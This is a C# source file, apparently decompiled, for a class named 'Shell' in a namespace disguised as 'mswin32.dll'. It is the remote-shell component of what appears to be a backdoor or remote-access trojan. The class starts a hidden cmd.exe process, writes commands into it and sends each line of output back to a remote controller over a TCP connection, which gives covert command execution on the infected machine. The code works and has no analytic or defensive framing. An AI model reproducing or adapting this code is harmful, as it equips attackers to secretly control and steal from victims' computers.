using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace mswin32.dll;

public class Shell
{
	private Process p;

	private Thread thread;

	private TcpClient mClient;

	public Shell(TcpClient Cl)
	{
		mClient = Cl;
	}

	public void Start()
	{
		p = new Process();
		p.StartInfo.FileName = "cmd";
		p.StartInfo.Arguments = "cd\\";
		p.StartInfo.CreateNoWindow = true;
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.RedirectStandardInput = true;
		p.StartInfo.RedirectStandardOutput = true;
		p.Start();
		thread = new Thread(Reading);
		thread.IsBackground = true;
		thread.Start();
	}

	public void ExecuteCommand(string Command)
	{
		try
		{
			p.StandardInput.WriteLine(Command);
			p.StandardInput.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Reading()
	{
		while (true)
		{
			try
			{
				string text = p.StandardOutput.ReadLine();
				if (Operators.CompareString(text, "", false) != 0)
				{
					StreamWriter streamWriter = new StreamWriter(mClient.GetStream());
					streamWriter.WriteLine(text);
					streamWriter.Flush();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Stop()
	{
		try
		{
			p.Kill();
			thread.Abort();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
